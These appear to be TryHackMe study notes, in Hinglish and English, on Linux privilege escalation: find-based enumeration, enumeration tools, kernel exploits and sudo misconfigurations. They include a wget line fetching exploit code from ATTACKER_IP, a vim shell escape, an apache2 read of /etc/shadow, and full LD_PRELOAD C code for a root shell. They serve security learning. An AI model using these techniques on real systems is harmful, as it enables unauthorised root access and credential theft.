# 🔍 Linux Privilege Escalation – `find` Command (THM)

This document explains the **Linux `find` command** from a **Privilege Escalation (PrivEsc)** point of view, in **two formats**:

1. **General Way** – simple, real-life, Hinglish explanation
2. **Technical Way** – Linux-focused with commands and attacker mindset

---

## 🧠 Core Idea of `find`

### 🔹 General Way

`find` command = **system ko scan karne wali aankhen 👀**

Iska use karke hum dhundhte hain:

* Galat permissions
* Root-owned scripts
* SUID binaries
* Writable folders/files
* Recently changed files

> Privilege Escalation ka 80% part = **Enumeration**

---

### 🔹 Technical Way

`find` recursively filesystem scan karta hai based on:

* name
* permission
* owner
* time
* size
* type

**Syntax:**

```bash
find <start_path> <conditions>
```

---

## 📁 File & Directory Search

### 1️⃣ Find File by Name

#### General Way

Agar tumhe lagta hai koi **important file (flag, password, config)** exist karti hai, tum naam se search karte ho.

#### Technical Way

```bash
find . -name flag1.txt
find /home -name flag1.txt
```

> Case-insensitive search:

```bash
find / -iname flag1.txt
```

---

### 2️⃣ Find Directory by Name

#### General Way

Config directories me aksar **credentials & secrets** hote hain.

#### Technical Way

```bash
find / -type d -name config
```

---

## 🔐 Permission-Based Enumeration (PrivEsc Gold)

### 3️⃣ World-Writable Files (777)

#### General Way

Agar koi file **sab users ke liye writable** hai, tum usme apna malicious code daal sakte ho.

#### Technical Way

```bash
find / -type f -perm 0777
```

---

### 4️⃣ Executable Files

#### General Way

Executable files agar root ke under chal rahi hain → exploit possible.

#### Technical Way

```bash
find / -perm a=x
```

---

### 5️⃣ Files by Owner

#### General Way

Specific user (jaise `frank`) ke files suspicious ho sakte hain.

#### Technical Way

```bash
find /home -user frank
```

---

## ⏱️ Time-Based Enumeration

### 6️⃣ Recently Modified Files

#### General Way

Recently modified files aksar:

* scripts
* cron jobs
* backups

#### Technical Way

```bash
find / -mtime 10
```

---

### 7️⃣ Recently Accessed Files

#### General Way

Recently accessed files me **passwords ya logs** ho sakte hain.

#### Technical Way

```bash
find / -atime 10
```

---

### 8️⃣ Recently Changed (Minutes Level)

#### General Way

Agar abhi-abhi koi file change hui hai → system ka kaam chal raha hai.

#### Technical Way

```bash
find / -cmin -60
find / -amin -60
```

---

## 📦 File Size Enumeration

### 9️⃣ Large Files

#### General Way

Large files = backups, logs, dumps → sensitive info ho sakti hai.

#### Technical Way

```bash
find / -size 50M
find / -size +100M
find / -size -5M
```

---

## 🚫 Error Suppression (Clean Output)

### General Way

`find` bahut saare **Permission denied** errors deta hai.

### Technical Way

```bash
2>/dev/null
```

Example:

```bash
find / -type f -perm 0777 2>/dev/null
```

---

## ✍️ Writable Directories (High Risk)

### 🔟 World-Writable Directories

#### General Way

Writable directory me tum:

* files create kar sakte ho
* scripts replace kar sakte ho

#### Technical Way (Equivalent Commands)

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

---

### 🔟 World-Executable Directories

#### General Way

Executable directory = system yahan se commands run karega.

#### Technical Way

```bash
find / -perm -o x -type d 2>/dev/null
```

---

## 🛠️ Development Tools Enumeration

### 1️⃣1️⃣ Programming Languages

#### General Way

Python / Perl / GCC mil gaya → exploit likhna easy.

#### Technical Way

```bash
find / -name python*
find / -name perl*
find / -name gcc*
```

---

## 🔥 SUID Files (Privilege Escalation King)

### 1️⃣2️⃣ SUID Bit Files

#### General Way

SUID file bolti hai:

> "Mujhe chalao, mai root ban ke chalungi"

#### Technical Way

```bash
find / -perm -u=s -type f 2>/dev/null
```

---

## 🧠 Attacker Mindset

### General Thinking

* Kaunsi cheez root ke under chal rahi hai?
* Kaunsi cheez mai modify kar sakta hoon?

### Technical Thinking

* Writable + root execution = 🔥
* SUID + exploitable binary = 🔥
* Cron + writable script = 🔥

---

## ✅ THM Practical Enumeration Flow

```bash
find / -perm -u=s -type f 2>/dev/null
find / -writable -type d 2>/dev/null
find / -type f -perm 0777 2>/dev/null
find / -mtime 1
```

---

### 🎯 Summary

* `find` is the **most powerful enumeration command** in Linux PrivEsc
* Always think: **Who owns it? Who can write it? Who executes it?**

---

#  Enumeration Tools 

During **Linux Privilege Escalation**, manual enumeration is critical, but it can be **time-consuming**. Enumeration tools help **save time**, though they may **miss certain attack vectors**.

This document explains **popular Linux enumeration tools** in **two formats**:

1. **General Way** – simple Hinglish + mindset
2. **Technical Way** – tool purpose, requirements, and usage

---

## ⚠️ Important Rule (Mindset)

> Enumeration tools are **helpers**, not replacements.
>
> ✔ Use tools to **speed up**
> ❌ Don’t depend only on tools

Real attackers :

* Manual understanding
* Tool-assisted confirmation

---

## 🧠 Why Multiple Tools?

### 🔹 General Way

Har system alag hota hai:

* Kabhi Python nahi hota
* Kabhi Bash hi allowed hota
* Kabhi binary execution blocked hota

Isliye:

> Ek hi tool pe dependent rehna = risky

---

### 🔹 Technical Way

Tool execution depends on:

* Installed languages (bash, python, perl)
* File upload permissions
* Internet access
* CPU / kernel restrictions

---

# 🔍 Popular Linux Enumeration Tools

---

## 1️⃣ LinPEAS (Most Popular)

### 🔹 General Way

**LinPEAS = fast scanner + colorful output 🌈**

Ye tool system me **almost sab kuch** check karta hai:

* SUID files
* sudo permissions
* cron jobs
* writable files
* kernel exploits

> Best for **quick overview**

---

### 🔹 Technical Way

* Language: **Bash**
* Requirements: `/bin/bash`

**Usage:**

```bash
chmod +x linpeas.sh
./linpeas.sh
```

**Strengths:**

* Very detailed
* Color-coded risks

**Limitations:**

* Large output
* May miss custom misconfigs

---

## 2️⃣ LinEnum

### 🔹 General Way

**LinEnum = clean & beginner-friendly**

Acha tool hai agar:

* Tum naye ho
* Output simple chahiye

---

### 🔹 Technical Way

* Language: **Bash**

**Usage:**

```bash
chmod +x LinEnum.sh
./LinEnum.sh
```

**Checks:**

* Kernel info
* SUID files
* cron jobs
* writable files

**Limitation:**

* Less aggressive than LinPEAS

---

## 3️⃣ Linux Exploit Suggester (LES)

### 🔹 General Way

**LES = kernel exploit advisor 🧠**

Ye tool batata hai:

> "Tumhara kernel vulnerable hai ya nahi"

---

### 🔹 Technical Way

* Language: **Bash / Python (version dependent)**

**Usage:**

```bash
./linux-exploit-suggester.sh
```

**Focus:**

* Kernel version
* Known privilege escalation exploits

⚠️ **Note:**

* Exploit chalana risky ho sakta hai


---

## 4️⃣ Linux Smart Enumeration (LSE)

### 🔹 General Way

**LSE = intelligent + logic-based enumeration**

Ye tool:

* Har cheez dump nahi karta
* Sirf **interesting findings** dikhata hai

---

### 🔹 Technical Way

* Language: **Bash**

**Usage:**

```bash
chmod +x lse.sh
./lse.sh
```

**Modes:**

```bash
./lse.sh -l1   # basic
./lse.sh -l2   # detailed
```

**Strength:**

* Clean output
* Smart filtering

---

## 5️⃣ Linux Priv Checker

### 🔹 General Way

**Old but useful** tool

Basic checks karta hai:

* sudo permissions
* writable files
* SUID binaries

---

### 🔹 Technical Way

* Language: **Python**

**Usage:**

```bash
python linuxprivchecker.py
```

⚠️ Requires **Python installed**

---

# 🔄 Tool Selection Strategy (Very Important)

### 🔹 General Way

Socho:

> "Target system mujhe kya allow kar raha hai?"

| Situation             | Tool                    |
| --------------------- | ----------------------- |
| Only bash available   | LinPEAS / LinEnum / LSE |
| Python available      | Linux Priv Checker      |
| Kernel exploit needed | LES                     |

---

### 🔹 Technical Way

Before running tool:

```bash
which python
which bash
uname -a
```

---

# 🧠 Attacker Mindset

### General Thinking

* Tool output ≠ exploit
* Tool sirf **direction** deta hai

### Technical Thinking

* Always verify manually
* Understand *why* something is vulnerable

---

## ✅  Recommended Workflow

1️⃣ Manual enumeration (`id`, `sudo -l`, `find`)
2️⃣ Run **LinPEAS or LSE**
3️⃣ Validate findings manually
4️⃣ Exploit carefully

---

## 🎯 Summary

* Enumeration tools **time saver** hain
* Manual knowledge mandatory hai
* Multiple tools seekhna = strong attacker

---


# 🧠  Kernel Exploits 

Kernel exploits are one of the **most powerful** privilege escalation techniques in Linux. If successful, they usually result in **root privileges**, but they also come with **high risk**.

This document explains **Kernel Privilege Escalation** in **two forms**:

1. **General Way** – simple Hinglish + real-life understanding
2. **Technical Way** – Linux internals + exploitation workflow

---

## 🔐 What is Privilege Escalation?

### 🔹 General Way

Privilege escalation ka final goal hota hai:

> **Root banna 👑**

Ye ho sakta hai:

* Direct vulnerability exploit karke
* Ya kisi aur user ka access leke jiske paas zyada power ho

Aksar cases me:

* Koi single bug root nahi deta
* Balki **misconfiguration + weak permissions** ka combo hota hai

---

### 🔹 Technical Way

Privilege escalation means:

* Low-privileged user → `uid=0`

Usually achieved via:

* Misconfigured sudo
* SUID binaries
* Writable cron jobs
* Kernel vulnerabilities

---

## 🧠 What is the Linux Kernel?

### 🔹 General Way

Kernel = **Linux ka brain 🧠**

Ye control karta hai:

* Memory
* Processes
* Hardware
* Applications ke beech communication

Isliye kernel hamesha:

> **Highest privilege (root)** pe chalta hai

---

### 🔹 Technical Way

The Linux kernel:

* Runs in **ring 0** (highest privilege)
* Manages system calls
* Interfaces between hardware and user-space programs

👉 Agar kernel vulnerable ho:

> User-space se direct root access possible

---

## ⚠️ Why Kernel Exploits Are Dangerous

### 🔹 General Way

Kernel exploit = **engine ke andar haath daalna**

Agar galat ho gaya:

* System crash 💥
* Machine reboot
* Data corruption

Real-world pentest me:

> Pehle permission leni zaroori hai

---

### 🔹 Technical Way

Risks include:

* Kernel panic
* DoS
* System instability

⚠️ Always last option in real engagements

---

## 🧪 Kernel Exploit Methodology

### 🔹 General Way

Simple steps:

1. System ka kernel version pata karo
2. Us version ka bug dhundo
3. Bug exploit karo

Lagta simple hai, but risky hai 😅

---

### 🔹 Technical Way

#### 1️⃣ Identify Kernel Version

```bash
uname -a
```

Or:

```bash
cat /proc/version
```

---

#### 2️⃣ Search for Kernel Exploits

Sources:

* Google
* Exploit-DB
* CVE Details
* searchsploit

⚠️ Tip:

> Kernel version ke saath **distribution** bhi mention karo

Example search:

```text
Linux kernel 4.15 Ubuntu privilege escalation exploit
```

---

#### 3️⃣ Use Automated Helper (Optional)

### 🔹 Linux Exploit Suggester (LES)

```bash
./linux-exploit-suggester.sh
```

⚠️ Remember:

* False positives possible
* False negatives possible

Tool ≠ guarantee

---

#### 4️⃣ Understand the Exploit Code (MANDATORY)

### 🔹 General Way

Blindly exploit chalana = **dangerous**

Exploit kya karta hai samjho:

* File overwrite?
* User creation?
* Kernel patch?

---

### 🔹 Technical Way

Before running exploit:

* Read comments
* Read usage instructions
* Check if cleanup needed

Some exploits:

* Add SUID shell
* Modify `/etc/passwd`
* Disable security modules

---

#### 5️⃣ Run the Exploit

Example:

```bash
gcc exploit.c -o exploit
./exploit
```

Or:

```bash
./exploit.sh
```

If successful:

```bash
whoami
# root
```

---

## 📦 Transferring Exploit Code to Target

### 🔹 General Way

Tumhare system se target tak exploit pahunchana hoga.

---

### 🔹 Technical Way

#### On Attacker Machine:

```bash
python3 -m http.server 8000
```

#### On Target Machine:

```bash
wget http://ATTACKER_IP:8000/exploit.c
```

---

## 🧠 Important Hints & Notes (THM + Real World)

### 🔹 Be Specific When Searching

❌ Linux kernel exploit

✅ Linux kernel **4.4.0-116 Ubuntu** privilege escalation

---

### 🔹 Always Read the Exploit Code

* Understand impact
* Check cleanup steps
* Know if reboot required

---

### 🔹 Lab vs Real Pentest

| Lab / CTF         | Real Pentest         |
| ----------------- | -------------------- |
| Kernel exploit ok | Needs permission     |
| Crash acceptable  | Crash NOT acceptable |
| Aggressive        | Careful              |

---

## 🧠 Attacker Mindset

### General Thinking

* Kernel exploit = **last option**
* Misconfigs pehle try karo

### Technical Thinking

* Match kernel + distro
* Verify exploit reliability
* Prepare rollback if possible

---

##  Recommended Workflow

1️⃣ Try misconfigurations first
2️⃣ Enumerate kernel version
3️⃣ Check LES suggestions
4️⃣ Research manually
5️⃣ Exploit carefully

---

## 🎯 Summary

* Kernel exploits often lead directly to **root**
* Powerful but **dangerous**
* Always understand before execution

---

💡 *Kernel exploitation is about precision, not speed.*

# `sudo` Exploitation (THM)

The `sudo` command is one of the **most common and most dangerous** privilege escalation vectors in Linux when **misconfigured**.

This document explains **sudo-based privilege escalation** in **two forms**:

1. **General Way** – simple Hinglish + real-life understanding
2. **Technical Way** – commands, abuse techniques, and attacker mindset

---

## 🧠 What is `sudo`?

### 🔹 General Way

`s‍udo` ka matlab:

> "Normal user ko thodi der ke liye **root ki power** dena"

Admins kabhi-kabhi users ko bolte hain:

* Tum root nahi ho
* BUT tum **kuch specific commands** root ki tarah chala sakte ho

👉 Example:
Junior SOC analyst ko **Nmap** chalana hai root ke saath,
but poora system control nahi dena.

---

### 🔹 Technical Way

`s‍udo` allows a permitted user to run commands as:

* root
* or another specified user

Permissions are defined in:

```bash
/etc/sudoers
```

---

## 🔍 Checking sudo Permissions

### 🔹 General Way

Sabse pehle dekho:

> "System mujhe kya-kya root ke saath karne de raha hai?"

---

### 🔹 Technical Way

```bash
sudo -l
```

Example output:

```text
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```

👉 This means `find` can be run as root ❗

---

## 🌐 GTFOBins – Your Best Friend

### 🔹 General Way

GTFOBins ek **cheatbook** hai jo batata hai:

> "Is command se root shell kaise nikale"

---

### 🔹 Technical Way

Website:

```text
https://gtfobins.github.io/
```

If a command appears in `sudo -l`, always:

* Search it on GTFOBins

---

## 🛠️ Sudo Exploitation Techniques

---

## 1️⃣ Direct Shell Escape (GTFOBins)

### 🔹 General Way

Agar koi command:

* Editor hai (vim, nano)
* Interpreter hai (python, perl)

Toh tum shell escape karke root ban sakte ho 😈

---

### 🔹 Technical Way

Example:

```bash
sudo vim
```

Inside vim:

```vim
:!/bin/bash
```

Result:

```bash
whoami
root
```

---

## 2️⃣ Leveraging Application Functions (Apache2 Example)

### 🔹 General Way

Kabhi-kabhi command dangerous nahi hoti,
but uske **options dangerous** hote hain.

👉 App ka feature hi exploit ban jata hai.

---

### 🔹 Technical Way

If user can run Apache2 with sudo:

```bash
sudo apache2 -f /etc/shadow
```

Result:

* Error message
* But leaks **first line of /etc/shadow** ❗

👉 Information disclosure attack

---

## 3️⃣ Environment Variable Abuse – `LD_PRELOAD`

### 🔹 General Way

System bolta hai:

> "Program chalne se pehle library load karo"

Tum bolte ho:

> "Meri library load karo 😈"

---

### 🔹 Technical Way

### 🔸 What is `LD_PRELOAD`?

* Forces program to load a shared library **before execution**
* Dangerous if allowed in sudo

Check sudo env:

```bash
sudo -l
```

Look for:

```text
env_keep+=LD_PRELOAD
```

---

## 🧪 LD_PRELOAD Exploitation Steps

### 1️⃣ Check LD_PRELOAD allowed

```bash
sudo -l
```

---

### 2️⃣ Write Malicious C Code

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Save as:

```bash
shell.c
```

---

### 3️⃣ Compile Shared Object

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

---

### 4️⃣ Execute with sudo

```bash
sudo LD_PRELOAD=/home/user/shell.so find
```

Result:

```bash
whoami
root
```

---

## ⚠️ Important Notes (VERY IMPORTANT)

### 🔹 LD_PRELOAD Limitations

* Ignored if **real UID ≠ effective UID**
* Needs `env_keep` enabled

---

### 🔹 Lab vs Real Pentest

| THM / CTF       | Real Pentest        |
| --------------- | ------------------- |
| Aggressive ok   | Permission required |
| Root shell goal | Stability priority  |

---

## 🧠 Attacker Mindset

### General Thinking

* `sudo` ≠ safe
* Allowed command = possible root

### Technical Thinking

* Check GTFOBins
* Abuse options & environment
* Understand execution context

---

## Sudo Exploitation Workflow

1️⃣ `sudo -l`
2️⃣ Identify allowed commands
3️⃣ Search on GTFOBins
4️⃣ Try function abuse
5️⃣ Try `LD_PRELOAD`

---

## 🎯 Summary

* `sudo` misconfiguration is a **top PrivEsc vector**
* GTFOBins is essential
* `LD_PRELOAD` can give instant root

---

💡 *If you can run it with sudo, you can probably break it.*

